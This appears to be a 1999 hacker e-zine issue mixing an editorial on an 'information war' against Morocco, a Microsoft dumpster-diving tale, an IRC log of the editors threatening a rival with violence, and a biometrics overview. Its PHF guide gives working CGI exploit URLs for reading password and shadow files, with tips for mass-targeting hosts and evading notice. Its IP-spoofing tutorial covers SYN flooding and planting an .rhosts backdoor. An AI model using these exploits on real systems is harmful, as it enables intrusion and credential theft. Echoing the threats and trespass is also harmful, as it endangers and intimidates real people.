:Editorial:

 Well, here we are. Welcome back to the Famed Goldmines of The
Discordant Opposition Journal. The true Underground E-Zine for
the future. We managed to churn out another issue. This it the
third issue, #2. Don't ask why its number 2 and issue 3. I blame
it on one of Rue's made drinking binges. 

 I am writing this on a Sunday afternoon. I went to bed at 7:45
this morning and got only 3 hours sleep. Rue and myself spent
8 straight hours slouched infront of a computer screen. We took
turns sitting at the computer picking through networks and stuff.
In the end, it was quite uneventful but it was informative. We
may do a write-up of Moroccan government security protocols in a
future issue. Yes, you read right, we too are Publicly announcing
our distaste on Moroccan Human Rights. The country is so antiquated
that they do not as of yet have a proper voting system. Some would
say that to vote the public must be educated. But those that are
undereducated would have no want to vote thus nullifying that 
argument. 

 Why should Moroccan people, who are no different to us, suffer 
more simply because democracy hasn't reached them yet. When 
freedom is threatened in Middle Eastern countries or Eastern 
Bloc Countries the Allied forces are swift to intervene, but they 
have all chosen to stay well out of the Moroccan problem.

 The Knights of Dynamic Discord have told the Editors that currently
they are launching an information attack on the resources of Morocco
and its government. They have issued this statement;

	'No one deserves this and we who are able to, should
	 fight for their rights. The Knights of Dynamic Discord
	 hereby declare information war on the infrastructure
	 of the Moroccan Government. 

 	 All Hail Discordia !'

	 -Issued by Deadpool and eccentricMind.

 That is the editorial for this issue. We the Editors of The DoJ
hereby claim no responsibility or involvement in any KoDD actions.
The conclusion has the usual junk in it about the Zine.

 Thank You.

 Cronus, Rue-the-Day

:The Joys of Trashing:
 Rue-the-Day

Prologue:
	Rue-the-Day and Cronus, your intrepid DoJ editors,
caught momentarily in a van's headlights as they try to blend
into the shadows. The van is 'Group 4 Security' - private rent
a cop types. Rue-the-Day and Cronus are standing in the darkness
between two Microsoft buildings. The van's driver fails to
notice them and continues on his rounds. The two hackers breathe
a sigh of relief and start back towards the main road....

Onwards:
	That night had already been eventful. Earlier on we had
prowled around two other Microsoft 'campus' areas. The first
had been dull, lots of CCTV cameras and bins padlocked into
cages. The second area had been of greater interest. Myself
and Cronus had noticed a row of bins and a dumpster in a
parking lot beside a building. We peered into the dumpster
and found nothing much until I noticed that one of the bins
was labelled "Paper Waste Only".. Hehehe. We took the lid off
the bin and started going through the blue tinted bags for
documents of interest. This activity had us absorbed until
we heard a key turning in a door behind us. As we turned we
saw a guard trying to get the door of a nearby building open.
After some fumbling he succeeded and the appropriate thing to 
do seemed to be to run like bloody hell. I squeezed through the 
gap between the dumpster and bin and tried to run. The problem 
was, I wasn't moving - my backpack was stuck.
	Cronus was understandably concerned - he was in the path
of the rapidly approaching (pissed off looking) security guard. 
He punched my backpack through the gap and we both sprinted off 
carrying bags of Microsoft documents with us. We ran out into 
traffic, over a large mound of dirt and across a patch of 
wasteland before finally stopping. At the bottom of this file
are some interesting extracts from our find...

Advice:
	Some general things to keep in mind. Try your best to be
 selective when trashing, discard unnecessary stuff - it'll just
 weigh you down. Choosing to trash either by day or night both
 have inherent advantages and disadvantages.

:The Darkedge Incident:
 The Editors

 Darkedge is an Irish guy who hangs out on Dalnet. Cronus is also
Irish and also hangs out on Dalnet in roughly the same areas as 
Dark. Cronus had been mail bombed with an expression that Dark 
had yelled at him earlier after being kicked from a channel that 
Cronus was opped in. And Cronus went looking for Darkedge on IRC.

/whois Darkedge 
  Gave this;
[ %%%%%%%%%%%%%%%%%%(whois info: Darkedge)%%%%%%%%%%%%%%%%%% ]

[ server    ] liberty.nj.us.dal.net 

Tdc.ie is Trinity College Dublin in Ireland and he was at the computer
labs there in the city centre. Cronus and Rue were at Cronus's house
online. 

<Darkedge> hi
<^cronus^> I had some trouble with my mail account ealrier
<^cronus^> don't suppose you know anything about it ?
<Darkedge> ohh
<Darkedge> thats right
<Darkedge> me
<Darkedge> well thank you for your faith in me cron
<^cronus^> What ?
<^cronus^> I have no faith in you
<^cronus^> do you know about it ?
<Darkedge> can i ask a question
<^cronus^> what ?
<Darkedge> am i the first person that came to mind about it
<^cronus^> I have already asked 5 people today
<Darkedge> heh
<Darkedge> just askin
<Darkedge> nope
<Darkedge> not me
<^cronus^> what wasn't you ?
<Darkedge> mail bombing is for lamers
<^cronus^> YOU FUCKER
<^cronus^> I never fucking mentioned mail bombing
<^cronus^> you WANKER !
<Darkedge> what else would it be
<^cronus^> could have been a virus, lack
<^cronus^> of working server
<^cronus^> anything...
<Darkedge> jeasus
<^cronus^> you fuckin idiot you're fucked
<^cronus^> Rue has vaguely mentioned breaking of legs...
<Darkedge> what??
<Darkedge> fuck you ....let rue try...i have nothing to do with
any shit you are saying....go blame someone else
<^cronus^> right so then
<^cronus^> will you still be in town in 15 minutes ???
<Darkedge> what are you talking about
<^cronus^> Rue will be there in a few minutes is that ok ?
<^cronus^> he is in temple bar at the moment
<^cronus^> at a cyber cafe...
<Darkedge> what are you on ??
<^cronus^> you got yourself into a shit storm now
<Darkedge>  are you playing a fucking joke on me??
<^cronus^> a joke ?
<^cronus^> you asked for Rue to break your legs
<^cronus^> does it sound like Rue's laughing ?

At this point, Cronus and Rue set up a Back Orifice server to bounce
a connection from a Cyber Cafe to IRC. They had been at the BetaCafe
in the City earlier that day and set it up.

[join(#hackers_ireland)] Rue-the-Day (BetaCafe@betacafe3.betacafe.ie)
[mode(#hackers_ireland)] "+o Rue-the-Day" by ChanServ
<Rue-the-Day> Sup All
<Darkedge> Rue?
<Rue-the-Day> Hi Cronus
<Darkedge> what the fuck is going on
<Rue-the-Day> Hey Daxxx, Zeris
<Rue-the-Day> ahh Darkedge
<^cronus^> Hey RUE !
<Darkedge> what am i being blamed for??
<Rue-the-Day> I'm in the beta cafe in temple bar
<Rue-the-Day> what seems to be the trouble ??

On checking where Rue was, it seemed that he wasn't simply at Cronus's
house but actually in Town near Trinity College. At this point we were 
both beginning to laugh heartily.

<Darkedge> Im in trinity
<Rue-the-Day> Your in trinity ? I could be there in a minute or two...
<^cronus^> Rue is kinda protective of his friends

Darkedge was pretty scared by this stage, but the plot went on.

<Rue-the-Day> anyway I have to go
<Rue-the-Day> I'll be back on later
<Rue-the-Day> places to go, people to see
<^cronus^> cya Rue - maybe later
<Rue-the-Day> anyway gotta go
[signoff(#hackers_ireland)] Rue-the-Day (Quit: Gone to Trinity)
<Darkedge> hang on rue
<Darkedge> shit

Cronus continued to talk with Darkedge in private. Rue was hysterical 
at this point.

<^cronus^> How long do you think Rue can walk from Temple Bar ?
<^cronus^> 5 minutes ? you think
<^cronus^> although he is very tall and walks fast
<Darkedge> i will be here all night
<^cronus^> whats wrong ?
<^cronus^> afraid to face him ?
<^cronus^> I've meet you and your half his size....
<Darkedge> yeah well
<Darkedge> well i have a lot of friends so
<^cronus^> alot of friends ???
<^cronus^> they won't protect you
<^cronus^> you haven't meet Rue
<Darkedge> its a pity really
<Darkedge> see here is the thing
<Darkedge> he can throw as many punches as he wants ... i dont care
<^cronus^> the doctors will care !
<^cronus^> and who mentioned punchs
<^cronus^> its the metal bar you should worried about
<Darkedge> he can kill me...like i give a shit
<^cronus^> I'm sure he'll try
<^cronus^> you don't care for your life ?
<^cronus^> cause niether does he !
<Darkedge> ahh well
<Darkedge> just wish it could have been different
<^cronus^> I can't wait to see this
<^cronus^> Infact
<^cronus^> I think I'm gonna come into town
<^cronus^> and have a look at the bruises
<^cronus^> ... hehe ...
<^cronus^> Cya in about 15 minutes

Cronus quit off IRC but then came back right away and Darkedge had
already gone off. Cronus and Rue were both far from the City Center,
but Darkedge left Trinity afraid that Rue was on his way. It was 
never mentioned again, but at the next 2600 Meeting in the City, 
Darkedge pulled Cronus and Rue aside and apologised and claimed
innocence. 
 We both still laugh about the whole thing to this day. Beware.

:The Science of Biometrics:
 Cronus

 Biometrics is the upcoming science of authorising people by
their individual physical characteristics. Finger printing is
the oldest and most widely used biometrics.
 I was waiting for this file to be published by a large Hacking
site that will go unnamed. Each time I dropped by, it would still
say Not yet finished, check back next month. So I decided to 
write the article myself and here you go.

 Explanation

 Passwords have been shown to be unsecured time after time. It 
is a widely held believe that the weakest part of any security
system is the password. Behind the password is a User, who is
forgetful and absentminded at the best of time. So modern
science has stepped up to the plate and offered an alternative. 
Biometrics is the art of recognising individuals by their unique
and untransferable physical characteristics.
 Biometrics are by no means new. They have been around for years
but until recently the price was always a limiting factor. The
US military have used it as a form of authentication since well
before the cold war. No, however, finger print readers are cheap
enough to be built into keyboards and mice.
 Biometrics are so unique that they need never be changed. They
are part of you, so they can never be stolen. They are constant
and effortless to use. And they are extremely safe. For example
the eye scanner from the New Jersey based company Iriscan, offers
the odds of one-in-10 to the power of 78.

 The Fingerprint

 It has been the practice of Police and Government agencies all
over the globe to use the unique pattern of the fingerprint as
a form of Biometric. This is both cheap and easily maintained. 
 An example of PC fingerprinting is Sony Corp.'s Puppy Logon 
System at www.iosoftware.com. Cheap, reliable and already in the
mainstream. 
 As the fingerprint has been in use for so long. It has proved
itself as a reliable Biometric and also it has dropped in price.

 The Hand

 A handprint is simply an fingerprint on a larger scale. Hand 
scanners, such as the $2,150 HandKey manufactured by Recognition 
Systems Inc., measure the hand's geometry rather than fine skin 
patterns, so they're useful in places such as shop floors and 
manufacturing operations, where dirt and nicks could cause 
problems with a finger scan.
 As yet pretty well untested on a large scale. But still very 
cheap. Fairground 'Love Testers' are often based on a hand scanner
and this shows there ease of use and cheapness.
 There is a new technique that records the vein pattern at the back
of the hand. This technique looks promising, but it exists only in
a prototype system, and no extensive tests to determine the 
performance of the method have been done. However, this could well
become an important biometric identification method. 

 The Eye

 A person's eye is as unique as a fingerprint and can be used to identify someone. 
 IriScan Inc.'s namesake product keeps an eye on high-security 
facilities. The unique pattern of the iris of the eye is measured
and compared to a database of known values. The pattern on the 
iris is so unique that the chance of mix-up is infinitesimally small.
 IriScan is designed for physical access control, generally coming
in the form of a wall mounted reader. The system is currently in
use in prisons and military facilities for its security. As the
pattern matching software is currently being adapted to accommodate
face recognition for future planed products.
 The reader, software and PC cost $6,500. IriScan can be reached at
www.iriscan.com.

 The Face

 The ideal biometric identification method would be automatic face recognition. This is a difficult pattern recognition problem because heads can rotate and move in various ways. Pattern recognition 
software can be used in airports and border crossings to catch
criminals and terrorists. The facial software matches distinct features
of the human face to a digitally recorded copy to determine if the 
scanner recognises you. 
 Very new and still quite experimental. This form of Biometric can't
really take into account the change of appearance caused by ageing,
sickness or hair growth. Extremely complex software must be written
to ensure the error level of the system is kept to a minimum. If 
short, not a very secure Biometric.
 More than a dozen vendors offer facial recognition products, which
can cost as little as $150 to $300 per node. 


 The Voice

 Voice verification is by far the most socially acceptable Biometric.
It combines ease-of-use with lack of cost. It has several distinct
advantages over the other biometric techniques. First, it's perfect for telecommunications applications. Second, most modern PCs already have the necessary hardware. If they don't, a 16-bit sound card can be purchased for about $50, and a condenser microphone costs about $10. 
 Voice patterns are easily recorded and digitised, but the voice
changes because of the time of day, illness and background noise. This
means that even though this is perhaps the most convenient Biometic 
it is also probably the most insecure. Taped speech has been known to 
defeat this medium of authentication. Hardly secure.

 The Signature 

 Some Biometric products observe hand-written signatures. The process
requires a digitising tablet such as a Wacom PenPartner. Not widely 
used and not secure at all. The signature is as weak as a password.
Only a Biometric by the vaguest of senses.

 The Smart Card

 The Biometrics of the future will possibly be packaged with Smart 
Cards. Your individual Biometric data will be hard-coded into the
Smart Card and not matter where you are, the Biometric will be able
to verify that it is really you once you have your Smart Card.

 Security

 Most Biometrics are quite secure and that is why they are favoured
to te antique password. But simply because its a Biometric doesn't
make it secure. Anywhere that needs the level of security that comes
with a Biometric should do some research to ensure that they are 
getting a suitable type.
 The US military has been using many different forms of Biometry for
years and this stands for its reliability and overal security. Not to
be underestimated, but Biometrics will become the next major obstacle
for the Wily Hacker.

:The Complete Guide to PHF:
 Digital Avatar

1. What is PHF? 

 The PHF (packet handler function) white pages directory
services program distributed with the NCSA httpd, versions 
1.5a and earlier, and also included in the Apache distribution 
prior to version 1.0.5, passes unchecked newline (hex 0a) 
characters to the Unix shell. Unauthorised access to the server 
host may allow an intruder to read, modify, or destroy files. 
The phf program implements a form-based interface to a local 
CCSO Name Server. The CCSO Name Server is a white pages service 
used for looking up name and address information about people. 

 With phf, a hacker can execute commands on the server host 
using the same user-id as the user running the "httpd" server. 
If "httpd" is being run as root, the hacker's commands are also 
run as root. He can access any file on the system that is 
accessible to the user-id that is running the httpd server. 

 The phf phone book script file in the cgi-bin directory can 
be exploited to give a hacker the password (etc/passwd) file in 
Unix systems. The phf phone book script is distributed with NCSA 
and Apache httpd. This default file is a sample form titled "Form 
for CSO PH query" and can be exploited to view files on a system. 
The phf exploit is one of the most common ways of obtaining 
password files of of systems on the internet. 

2. How do I use PHF? 

 Alright. To use PHF you enter the following command line into 
any web browser: 
http://www.target_goes_here.com/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd 
This takes you to the /etc/passwd file of the target computer. 
Neat, huh? Anything after Qalias=x%0a/bin/ is the command. You can 
do virtually any command. You cannot edit files though. It doesnt 
work. 

Examples: 

/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/shadow -displays the 
shadow file
/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd -displays the 
passwd file
/cgi-bin/phf?Qalias=x%0a/bin/ls%20/ -lists the root dir
/cgi-bin/phf?Qalias=x%0a/bin/ls%20/bin -lists the bin dir
/cgi-bin/phf?Qalias=x%0a/bin/ls%20-la%20/bin -lists the bin dir 
and shows file permissions
/cgi-bin/phf?Q=%0aid - gives you the uid of nobody
/cgi-bin/phf?Q=%0a/bin/uname%20-a - give operating system
/cgi-bin/phf?Q=%0apwd - print working directory
/cgi-bin/test-cgi?* - get all files in /cgi-bin/
/cgi-bin/test-cgi?/* - get all directories
/cgi-bin/nph-test-cgi?* - get all files in /cgi-bin/
/cgi-bin/nph-test-cgi?/* - get all directories
/cgi/bin/phf?Q=%0a/bin/ypcat%20passwd - get ypcat passwd

 3. What happens if it says "404 Error" or "Caught on Candid 
Camera"? 

 Well, a 404 Error indicates that the target is patched of this 
hole already or that they do not have PHF on their system, among 
other things. If it gives you a 404, move on to a new target. 

 Caught on Candid Camera is a small joke in a way. When you get 
this screen it means they have logged that you have just tried 
to access them via PHF. Don't worry about getting caught though. 
They hardly ever report it. Just don't go try the same place every 
time. If they are logging you then they might get a little curious 
after you try PHF on them 10 times. Use PHF wisely. 

4. How do I find new targets? 

 The usual way to get new targets is to pick a country, say Japan. 
Go to www.altavista.com, next and search for "ac.jp". This will 
turn up a lot of results from the academic hosts in Japan. Take 
each listing's address and put it before the /cgi-bin in the PHF 
command line. You can scan all the results quite quickly if you 
have two browser windows open. One contains: 

 http://www.target_goes_here.com/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd 

 The other contains your altavista search. Simply Copy the address 
from altavistsa and paste it onto the www.target_goes_here.com in 
your other window. You can go through 75-100 sites quite easily. I 
tend to get about 1/100 hits that have a usable PHF. Don't expect 
anything better...

:Interview with Digital Avatar:

 Shortly after we first DoJ was released we already decided that
we need Staff. Digital Avatar was the first. He quickly became
the Assistant Editor. Helping with promotion, editing and also
submissions.

DoJ: How long have you been in the h/p scene ?
DA: Since about 1992. I was 13 then and I was just playing around,
but it helped...

DoJ: What drew you in ?
DA: I had watched some movies here and there and had seen some 
things on the news. So I decided to just check a few things out. 
My very first impression of the scene occured when I typed 
"Hacking" into Yahoo. It really is that easy.

DoJ: What particular aspects interest you ?
DA: The 'culture' of the underground. It is a vastly changing 
region. One day a so-called wizard can be declared lame by 
hundreds of people and thats that. There isnt the usual 
cover-up of things here on the scene. The entire style is 
different than the real world. Its quite intersting.

DoJ: What would you attribute to your main decision to want 
to learn ? 
DA: Probably all the clueless and not-so-clueless people out 
there who are bored and want to push their computing power 
beyond 'normal' boundries. Anyone can master these kind of 
things...so why shouldnt you try it once, at least?

DoJ: Have you ever been caught ? or gotten close ?
DA: Yes. My ISP's have gotten mad and threatened me and 
cancelled my service a bunch. I try not to do anything that 
will land me in jail. Do I play it safe? Yes.

DoJ: Do you follow any set of morals or is the chase of 
knowledge more important ?
DA: I dont hack politically, racially, for pr0n, power, or 
anything like that. I do it to test myself. It truly is the 
best game there is...

DoJ: On a topical subject, what is your opinion of the 
current trend to attack unfavourable countries ?
DA: I think that is really the wrong thing to do. Tampering 
with or "destroying" the computers of unfavorable countries 
is not going to do any good. The people need to be changed, 
not the machines.

DoJ: Whats the one thing you want the world to know about you ?
DA: I hate printers.

DoJ: Where and how can you be contacted ?
DA: E-Mail is the only sure way to reach me. I'm currently 
using apparitione@gmx.de. If I change my address and you get 
too stressed out then go  and take a look at my page 
[ http://members.xoom.com/damatrix/ ] and click "contact". 
That will always have an address that I will be receiving at.

DoJ: Perhaps a quote to finish off with ?
DA: 'Trust No One'

Fill-in the Blanks;

          Choice of Women: 'Dumb Blondes'
          OS: FreeBSD on a 486
          Food: Chips, Fries, Pepsi, and OJ [ not mixed ]
          Music: Pop/Techno...Beck, Beastie Boys, etc
          Films: Armageddon, the James Bond films...
          Sites: hackernews.com, cnn.com, yahoo.com

DoJ: Anything else ? A comment to someone you don't like 
perhaps...
DA: I think that everyone needs to have more fun. People 
are too stressed out.

DoJ: Thanks Digital
DA: No problem... just get your hand off my thigh... !::::::::::::::::::::::::::::::::::::::::::::::::::::::::Feb/99

 IP Spoofing is the art of hiding a connection behind packets
that seem to come from some arbitrary source.  Fooling a server 
into thinking your connection is coming from a spoofed source. 
This is the means by which a trust-related attack would take 
place. By appearing to come from somewhere else you would be 
able to circumvent any form of source authentication such as 
the legendary 'r' commands.
 I have taken the liberty of assuming that the reader has a
partial knowledge of TCP and IP protocols. But if you don't
there are references to some essential reading at the end.
 The one serious drawback to IP spoofing trust-related exploits
is that the initial attack is blind. Since you are impersonating
another server, you will be unable to accept any response from
the server under attack.

 Establishing a Connection

 The TCP protocol is technically defined as a protocol developed 
to allow co-operating computers to share resources across a 
network. In other words, share a connection to transfer data.
 TCP is the most widely used connection-oriented transport
protocol in the TCP/IP suite. This basically means that the two
hosts involved must both first establish a connection through
the form of 3-way handshake. All the 3-way handshake does is
set up the routines to transfer data. Sequence numbers of both
the hosts are exchanged so that a connection can be created. 
This 3-way handshake makes TCP harder to spoof then simple IP
packets.
 The connection handshake is as followed;

       X       ---SYN--->      Y
       X      <--SYN/ACK--     Y
       X       ---ACK--->      Y

 To begin with host X sends an IP packet with the SYN flag to 
Y. This tells host Y that a connection is about to be set up.
The sequence number that X sends will now be set as the ISN
(initial sequence number) for future communication. Host Y next
will reply with its own ISN with the SYN flag on and an ACK flag.
The ACK flag acknowledges X's first packet with its ISN plus one.
X then ACK's the other hosts ISN and communication can take place.

 The Sequence Number

 TCP is marketed as the reliable internet protocol. It accounts 
for all packets, resends lost packets and rearranges out of order 
data. The sequence number is used so that the other host can 
acknowledge receipt of the packet. The receiving end uses the
sequence number to ensure proper ordering of the data and to
eliminate duplicate data bytes.
 Sequence numbers are simply 32-bit variables. They range from 0
to 4,294,967,295.  Each packet sent across a TCP connection is
sequenced. TCP uses the concept of window advertisement for flow
control. The sliding window tells the other end of the connection
how much data can be buffered, the window size is 16-bits so a
receiving host can advertise up to a maximum of 65535 bytes. This
process can be thought of as a means to ensure that neither host 
begins to transmit above the acceptable level of the other host.
 In order to spoof a connection, you must understand how sequence
numbers are chosen and how they change throughout the connection.
The sequence number when a host is first booted is set to 1. The
initial sequence number is incremented by 128,000 every second.
This causes the 32-bit ISN variable to wrap every 9.32 hours is 
no connections occur. But whenever a connection attempt is issued
the ISN jumps by 64,000.
 This process is there to eliminate the possible problem that 
data from an old connection could arrive and damage the current 
connection. This is why random sequence numbers are not used. 
There would be no way to guarantee that arriving data would have 
a different sequence number as stray data that finally freed 
itself from a routing loop somewhere.

 Other Flags

 TCP header flags include RST (reset), PSH (push) and FIN (finish).
The RST flag causes the connection to be immediately torn down. 
The RST flag is basically an in-built error message for when one
host breaks the already established rules of connection. The PSH
flag tells the receiver to send all the queued data as soon as
possible. The FIN flag is the means whereby a host naturally 
closes a connections.

 Syn Flooding

 Once the trusted host is found, it must be disabled. Since the
attack intends to impersonate it, it is necessary to make sure that
the host cannot receive any extra network traffic. If it gets the
TCP packets from the target host, it would send a packet to close
the connection thinking it was an error.
 The best way to deny packets access to a server is to lock it up
with some form of Denial of Service attack. This is quite a complex
operation and requires much research. 
 We have seen above how TCP connections are created and these steps
to creating a connection can be used to the disadvantage of the 
trusted host. A Syn flood is a flood of specially crafter packets
with the Syn flag marked from a random source. The trusted host
picks up the packet and thinks that a connection is about to be
made and sets up the appropriate service. 
 By flooding the trusted server with random Syn packets it is 
possible to fill up the Process table and leave no more room for
new incoming packets. As the connections time out while the trusted
server waits for confirmation of the connection, it is necessary 
to fill the gap that is left. The attacker can send multiple Syn
packets every few seconds to the trusted host and keep it occupied.
 For more information this complex subject see the notes at the 
end of the file.

 The Attack

 To use IP spoofing as an attack you must first choose a target 
and work out a trust-relationship that exists on that server. The
sequence numbers are calculated. The trusted server is put into 
a continual Denial of Service attack and then impersonated. The
attacker then simply issues a command to give him/her a way back
in.
 Here is a step by step outline of the attack;

 X(forged as Z)    ---SYN--->      Y
       Z          <--SYN/ACK--     Y
 X(forged as Z)    ---ACK--->      Y
 X(forged as Z)    ---PSH--->      Y

 The first packet from the attacker has the source IP address 
spoofed as Z which is the trusted host. Y responds with an Ack
of the first packet to Z, but since the trusted host Z is in
the middle of a storm of Syn packets it does not receive the 
Ack packet. 
 The attacker must pause for a moment so that the target host
Y actually has time to send the Ack packet. Then X sends its
own Ack packet with the presumed sequence number plus one since
it is the second Ack. If the calculated sequence number is 
correct then by the last stage the target host believes it is
connected to the trusted host Z and data can be sent.
 Since the attack is blind, the general idea once the trust has
been exploited is to insert a backdoor into the system. The 
most simplest could be 'cat + + >> ~/.rhosts`.  This is a good
idea because it is quick, allows for simple re-entry, and is not
interactive.  Remember the attacker cannot see any traffic coming
from the target, so any responses are sent off into oblivion.

 Summary

 IP spoofing is not difficult because IP is easily forged. This
attack works because many network connections rely on source
authentication. The presumption is that source authentication is
that it is easy and safe. But it is most definitely not the latter.
The most difficult part of this attack is the sequence number 
calculation. This takes timing, skill and guesswork.

:Ask Dr. Klep - "Kleptic's Views":
 kleptic@grex.org

Well, this text is just about what I've been thinking about
lately. I've been thinking about many topics, some important, 
some not.. like "Why do you press harder on your remote 
controller for your TV when you know the batteries are dead" 
or "What would a chair look like if your legs bent the other 
way!?" and the most important, "If a tree fell in the woods 
and no one was around to see it, would the other trees make 
fun of it!?" Those are the not so important things I've been 
thinking about..

Yeah know what really pisses me off, all that Bill Clinton 
and Monica shit. I'm really tired of hearing about that.. and 
I'm sure all of you are too. First of all, I don't want him 
impeached, but I do think he's a jackass. Hey would you want 
Al Gore as president of the USA? I know I wouldn't. Yeah see I
don't think like most 'computer analysts' or "hackers", most
Hackers/phreaks/crackers/warez d00dz are mostly "anarchist". I 
believe in order in a country, if there wasn't any order people 
would cause havoc all the time.. and people would die. And I'm 
sure no one REALLY wants to die.

And how come older people or adults think that teenagers, or 
people in the age area of 14-21 are nothing but a bunch of rowdy 
misfits!? And that we all have nothing to do but do drugs and 
have sex? That's not all true in fact. Not all kids do drugs or 
have sex. Yeah see I live a lifestyle that most of you have 
probably heard about. Its called "Straight Edge". Straight Edge 
meaning a drugfree lifestyle, 'don't drink and don't smoke"
those are the rules of today... before back in the 1980's the 
rules were "Don't Drink, Don't Smoke, Don't Fuck" The term 
"Straight Edge" was coined by Ian McKaye, the singer from a 
1980's hardcore/punk band called "Minor Threat". But im not 
gonna get into the history, I'm just trying to make a point.

This text is kinda short, and most of you probably don't give 
a rats ass of what I'm thinking about, but I'm just trying to 
make a point, This is the way I feel, and I personally don't 
give a shit if you think otherwise.

For the next instalment of "Ask Dr. Klep" I will need all of 
you to e-mail me questions or comments of anything in this 
text, or any other texts that I've written before, or any 
technical questions, I will answer them in the next Issue of DoJ.

Thank You,

I was just checking out your page and was wondering whether or
not you would like to co-operate with me in attempting to bring
about a total Boycott of Tinet in order to get them to bring 
down the phone charges?

Mail me here if you think we can work something out.

:Its worth noting that Tinet is Telecom Internet, an ISP run by
 the main telephone company here in Ireland. And unfortunately 
boycotting them will not by any means reduce phone charges. Infact 
since my site is a hacking site, whatever you had in mind is most
likely illegal and I amn't interested, but thanks for the thought.

Greetings and Salutations Cronus,  

Just got done reading your article in the latest edition of 
Blacklisted 411.  Good info.  was wondering if you would be 
interested in doing similar articles for the Electronic 
Underground Affiliations E-Zine? The EUA is made up of various 
hacker org's around the world and we like to put out a monthly 
zine to keep our members informed of what's going on and what's 
new in the hacker/phreak underground.  You can find us on the 
web @ "http://members.xoom.com/xxxxxxxx/"  We've kept a low 
key for the past few for a couple of reasons, namely the events 
revolving around Kevin M. and Justin P.  But alas, that has come 
about in a manner most unwanted.  Drop me a line and let me know 
if you are up for writing a few articles for us. 

Thanks
archive

:Hi archive, I responded personally and just wanted to comment
 on your mail for our readership. I understand that you didn't 
 realise that I am editor of this Zine, but may I presume to ask
 a few questions ? Why would a European E-Zine be worried about
 the prosecution of US hackers ? And why would a Publication 
 choose for any reason to keep a low profile ? Why publish anything
 if you have to keep it low profile ? I censored your URL as you
 seemed very worried about staying low profile.

:Conclusion:

 Well there you all are for another issue. Hope it keep you as
enthralled as previously. We try to keep up the usual degree of
crap each issue. We are sure you lot have complaints so send
them to discordia@Rue-the-Day.net and we'll probably ignore you.

 We have some complaints of our own. We started this Zine out
of boredom and it seems that no-one is interested. Sure, we get
loads of hits on the site. Loads of people download the Zine
but apart from abuse. Rarely do we get a serious contributor.
We need, I repeat WE NEED, submissions of stories, how-to's, art,
poems, quotes, technical FAQ's, hacking texts, underground exploits
and anything else you have lying around. Unlike the swanky print
publications that you actually have to PAY for... the DoJ is free
and we need your help to keep it up.  Cronus and Rue do not intend
to write anything for the next issue. We want your help in filling
the space. 

 Much thanks go out to Kleptic and Digital Avatar for both their
continued support. Thank You Guys. Ethercat has always been willing
to help and much thanks go out to her for putting up with all our
wild ideas... rOTTEN was the Original ASCII artist and for this 
issue we decided we needed a change. The new art is done by an
anonymous author, but thanks go out to carsten_bund@mediacube.de.
Also we recently got our first contribution of Digital Art to the
Gallery section of the site, thanks go out to Michael Perryman.

 Kleptic has his now regular column 'Ask Dr. Klep' and we thought
the name would be enough to inspire questions but obviously not.
Kleptic, Klep to his friends, is a very well rounded underground
figure and is willing to answer all your questions, even the ones
your parents would never answer growing up. So mail him your deep
underground questions and he'll sort you with an answer...

 So till next time Folks. Same Discordant Time, Same Discordant
Channel.
